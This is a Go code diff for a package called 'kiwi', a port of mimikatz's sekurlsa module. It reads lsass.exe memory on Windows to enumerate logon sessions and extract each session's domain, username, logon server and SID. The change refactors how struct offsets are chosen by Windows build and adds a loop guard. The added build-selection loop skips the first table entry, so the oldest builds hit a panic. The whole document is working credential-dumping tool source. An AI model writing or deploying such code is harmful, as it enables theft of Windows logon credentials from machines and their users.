@@ -2,6 +2,7 @@ package kiwi
 
 import (
 	"bytes"
+	"fmt"
 	"runtime"
 	"sync"
 	"time"
@@ -232,7 +233,7 @@ var (
 	}
 )
 
-func (session *session) searchAddress(pHandle windows.Handle) error {
+func (session *session) searchAddresses(pHandle windows.Handle) error {
 	var patches []*patchGeneric
 	switch runtime.GOARCH {
 	case "386":
@@ -493,6 +494,7 @@ type msv10List63 struct {
 // https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c
 
 type lsaEnum struct {
+	minBuild              uint32
 	size                  uintptr
 	offsetToLogonID       uint32
 	offsetToLogonType     uint32
@@ -514,8 +516,9 @@ var (
 	msv10List62Struct = msv10List62{}
 	msv10List63Struct = msv10List63{}
 	// key = version smaller than minimum windows build
-	lsaEnums = map[uint32]*lsaEnum{
-		buildMinWin2003: {
+	lsaEnums = []*lsaEnum{
+		{
+			minBuild:              buildMinWin2003,
 			size:                  unsafe.Sizeof(msv10List62Struct),
 			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List51Struct.logonID)),
 			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List51Struct.logonType)),
@@ -528,7 +531,8 @@ var (
 			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List51Struct.logonTime)),
 			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List51Struct.logonServer)),
 		},
-		buildMinWinVista: {
+		{
+			minBuild:              buildMinWinVista,
 			size:                  unsafe.Sizeof(msv10List62Struct),
 			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List52Struct.logonID)),
 			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List52Struct.logonType)),
@@ -541,7 +545,8 @@ var (
 			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List52Struct.logonTime)),
 			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List52Struct.logonServer)),
 		},
-		buildMinWin7: {
+		{
+			minBuild:              buildMinWin7,
 			size:                  unsafe.Sizeof(msv10List62Struct),
 			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List60Struct.logonID)),
 			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List60Struct.logonType)),
@@ -554,7 +559,8 @@ var (
 			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List60Struct.logonTime)),
 			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List60Struct.logonServer)),
 		},
-		buildMinWin8: {
+		{
+			minBuild:              buildMinWin8,
 			size:                  unsafe.Sizeof(msv10List62Struct),
 			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List61Struct.logonID)),
 			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List61Struct.logonType)),
@@ -567,7 +573,8 @@ var (
 			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List61Struct.logonTime)),
 			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List61Struct.logonServer)),
 		},
-		buildMinWinBlue: {
+		{
+			minBuild:              buildMinWinBlue,
 			size:                  unsafe.Sizeof(msv10List62Struct),
 			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List62Struct.logonID)),
 			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List62Struct.logonType)),
@@ -580,7 +587,8 @@ var (
 			offsetToLogonTime:     uint32(unsafe.Offsetof(msv10List62Struct.logonTime)),
 			offsetToLogonServer:   uint32(unsafe.Offsetof(msv10List62Struct.logonServer)),
 		},
-		buildMinWin10: {
+		{
+			minBuild:              buildMinWin10,
 			size:                  unsafe.Sizeof(msv10List63Struct),
 			offsetToLogonID:       uint32(unsafe.Offsetof(msv10List63Struct.logonID)),
 			offsetToLogonType:     uint32(unsafe.Offsetof(msv10List63Struct.logonType)),
@@ -595,6 +603,15 @@ var (
 		},
 	}
 )
+
+func selectLSAEnum(enums []*lsaEnum, build uint32) *lsaEnum {
+	for i := len(enums) - 1; i > 0; i-- {
+		if build >= enums[i].minBuild {
+			return enums[i]
+		}
+	}
+	panic(fmt.Sprintf("failed to select LSA enum with build %d", build))
+}
 
 // LogonSession contains information about session.
 type LogonSession struct {
@@ -612,7 +629,7 @@ func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*LogonSes
 	session.mu.Lock()
 	defer session.mu.Unlock()
 	if session.listAddr == 0 {
-		err := session.searchAddress(pHandle)
+		err := session.searchAddresses(pHandle)
 		if err != nil {
 			return nil, errors.WithMessage(err, "failed to search address about logon session list")
 		}
@@ -620,29 +637,37 @@ func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*LogonSes
 	// get session list count
 	address := session.listCountAddr
 	var count uint32
-	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), unsafe.Sizeof(count))
+	size := unsafe.Sizeof(count)
+	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&count)), size)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read logon session list count")
 	}
 	session.log(logger.Debug, "logon session list count is", count)
-
-	// var retCallback bool
-
-	enum := lsaEnums[buildMinWin10]
-
+	_, _, build := session.ctx.getWindowsVersion()
+	enum := selectLSAEnum(lsaEnums, build)
 	// get session list
-	var sessions []*LogonSession
+	var logonSessions []*LogonSession
 	const listEntrySize = 2 * unsafe.Sizeof(uintptr(0))
 	listAddr := session.listAddr - listEntrySize
+	// prevent dead loop
+	ticker := time.NewTicker(3 * time.Millisecond)
+	defer ticker.Stop()
 	for i := uint32(0); i < count; i++ {
 		listAddr += listEntrySize
 		// read logon session data address
 		var addr uintptr
-		_, err = api.ReadProcessMemory(pHandle, listAddr, (*byte)(unsafe.Pointer(&addr)), unsafe.Sizeof(addr))
+		size := unsafe.Sizeof(addr)
+		_, err = api.ReadProcessMemory(pHandle, listAddr, (*byte)(unsafe.Pointer(&addr)), size)
 		if err != nil {
 			return nil, errors.WithMessage(err, "failed to read logon session data address")
 		}
 		for {
+			// prevent dead loop
+			select {
+			case <-ticker.C:
+			case <-session.ctx.context.Done():
+				return nil, session.ctx.context.Err()
+			}
 			if addr == listAddr {
 				break
 			}
@@ -650,40 +675,52 @@ func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*LogonSes
 			buf := make([]byte, enum.size)
 			_, err = api.ReadProcessMemory(pHandle, addr, &buf[0], enum.size)
 			if err != nil {
+				return nil, errors.WithMessage(err, "failed to read logon session memory")
+			}
+			logonSession, err := session.readSession(pHandle, buf, enum)
+			if err != nil {
 				return nil, errors.WithMessage(err, "failed to read logon session data")
 			}
-			domainNameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToDomainName]))
-			domainName, err := api.ReadLSAUnicodeString(pHandle, domainNameLus)
-			if err != nil {
-				return nil, err
-			}
-			usernameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToUsername]))
-			username, err := api.ReadLSAUnicodeString(pHandle, usernameLus)
-			if err != nil {
-				return nil, err
-			}
-			logonServerLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToLogonServer]))
-			logonServer, err := api.ReadLSAUnicodeString(pHandle, logonServerLus)
-			if err != nil {
-				return nil, err
-			}
-			sid, err := session.ctx.lsass.ReadSID(pHandle, *(*uintptr)(unsafe.Pointer(&buf[enum.offsetToSID])))
-			if err != nil {
-				session.log(logger.Debug, "failed to read SID from lsass.exe:", err)
-			}
-			logonID := *(*windows.LUID)(unsafe.Pointer(&buf[enum.offsetToLogonID]))
-			session := LogonSession{
-				LogonID:     logonID,
-				Domain:      domainName,
-				Username:    username,
-				LogonServer: logonServer,
-				SID:         sid,
-			}
-			sessions = append(sessions, &session)
+			logonSessions = append(logonSessions, logonSession)
 			addr = *(*uintptr)(unsafe.Pointer(&buf[0]))
 		}
 	}
-	return sessions, nil
+	return logonSessions, nil
+}
+
+func (session *session) readSession(pHandle windows.Handle, buf []byte, enum *lsaEnum) (*LogonSession, error) {
+	domainNameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToDomainName]))
+	domainName, err := api.ReadLSAUnicodeString(pHandle, domainNameLus)
+	if err != nil {
+		return nil, err
+	}
+	usernameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToUsername]))
+	username, err := api.ReadLSAUnicodeString(pHandle, usernameLus)
+	if err != nil {
+		return nil, err
+	}
+	logonServerLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToLogonServer]))
+	logonServer, err := api.ReadLSAUnicodeString(pHandle, logonServerLus)
+	if err != nil {
+		return nil, err
+	}
+	var sid string
+	sidAddr := *(*uintptr)(unsafe.Pointer(&buf[enum.offsetToSID]))
+	if sidAddr != 0x00 {
+		sid, err = session.ctx.lsass.ReadSID(pHandle, sidAddr)
+		if err != nil {
+			return nil, err
+		}
+	}
+	logonID := *(*windows.LUID)(unsafe.Pointer(&buf[enum.offsetToLogonID]))
+	logonSession := LogonSession{
+		LogonID:     logonID,
+		Domain:      domainName,
+		Username:    username,
+		LogonServer: logonServer,
+		SID:         sid,
+	}
+	return &logonSession, nil
 }
 
 func (session *session) Close() {
